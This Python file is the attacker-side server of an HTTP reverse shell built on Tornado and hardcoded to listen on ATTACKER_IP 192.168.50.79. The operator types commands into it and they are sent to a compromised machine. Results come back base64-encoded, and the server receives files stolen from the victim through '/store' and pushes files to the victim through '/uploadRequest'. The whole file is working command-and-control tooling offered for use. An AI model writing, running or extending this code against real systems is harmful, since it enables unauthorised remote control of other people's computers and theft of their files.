import tornado.ioloop
import tornado.web
import os
from sys import argv
from colorama import init, Fore, Back, Style
import base64
import re

ATTACKER_IP = '192.168.50.79'
ATTACKER_PORT = 80

class GlobalVariable:
    CURRENT_CLIENT_PATH = ">"
    CURRENT_FILE_UPLOAD = b""
    CURRENT_FILE_NAME = ""

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        command = input(GlobalVariable.CURRENT_CLIENT_PATH)
        if command == 'quit':
            print('\n    Shell connection ended on target machine. Press Ctrl+C to end Attacker-Side shell. \n')
        self.write(command)

    def post(self):
        if self.request.uri == '/storeFileName':
            fName = self.request.arguments['file'][0]
            altchars=b'+/'
            fName = re.sub(rb'[^a-zA-Z0-9%s]+' % altchars, b'', fName)  # normalize
            missing_padding = len(fName) % 4
            if missing_padding:
                fName += b'='* (4 - missing_padding)

            fName = base64.b64decode(fName, altchars)
            fName = fName.decode()

            if '/' in fName:
                array = fName.split("/")
                fName = array[len(array) - 1]
            elif '\\' in fName:
                array = fName.split("\\")
                fName = array[len(array) - 1]

            GlobalVariable.CURRENT_FILE_NAME = fName
            
        elif self.request.uri == '/store':
            if not os.path.exists('files'):
                os.makedirs('files')

            binData = self.request.body
            with open((os.path.dirname(os.path.realpath(argv[0]))) + '\\files\\' + GlobalVariable.CURRENT_FILE_NAME,'wb') as o:
                o.write(binData)

        elif self.request.uri == '/CDirectory':
            out = self.request.arguments['file'][0].decode()
            outWithPadding = base64.b64decode(out + '=' * (-len(out) % 4))
            GlobalVariable.CURRENT_CLIENT_PATH = outWithPadding.decode('cp1252') + "> "
        
        elif self.request.uri == '/uploadRequestFileName':
            self.write(GlobalVariable.CURRENT_FILE_NAME)

        elif self.request.uri == '/uploadRequest':
            out = self.request.arguments['file'][0].decode()
            outWithPadding = base64.b64decode(out + '=' * (-len(out) % 4))
            post_body = outWithPadding.decode('cp1252')

            file_name = ''
            if '/' in post_body:
                array = post_body.split("/")
                file_name = array[len(array) - 1]
            elif '\\' in post_body:
                array = post_body.split("\\")
                file_name = array[len(array) - 1]
            file_name = base64.b64encode(file_name.encode())

            if os.path.exists(post_body):
                GlobalVariable.CURRENT_FILE_NAME = file_name
                with open(post_body, 'rb') as f:
                    GlobalVariable.CURRENT_FILE_UPLOAD = f.read()
                    self.write(GlobalVariable.CURRENT_FILE_UPLOAD)

        elif self.request.uri == '/':
            init(convert=True)
            out = self.request.arguments['file'][0].decode()
            outWithPadding = base64.b64decode(out + '=' * (-len(out) % 4))
            print(outWithPadding.decode('cp1252').replace('INFO', Fore.GREEN + 'INFO' + Fore.RESET).replace('ERROR', Fore.RED + 'ERROR' + Fore.RESET))

def make_app():
    return tornado.web.Application([
        (r"/CDirectory", MainHandler),
        (r"/uploadRequest", MainHandler),
        (r"/store", MainHandler),
        (r"/", MainHandler),
        (r'/storeFileName',MainHandler),
        (r'/uploadRequestFileName',MainHandler),
    ])

if __name__ == "__main__":
    app = make_app()
    app.listen(port=ATTACKER_PORT, address=ATTACKER_IP)

    try:
        tornado.ioloop.IOLoop.current().start()
    except Exception:
        tornado.ioloop.IOLoop.current().stop()
        print('\n    Shell connection ended on target machine. Press Ctrl+C to end Attacker-Side shell. \n')
        pass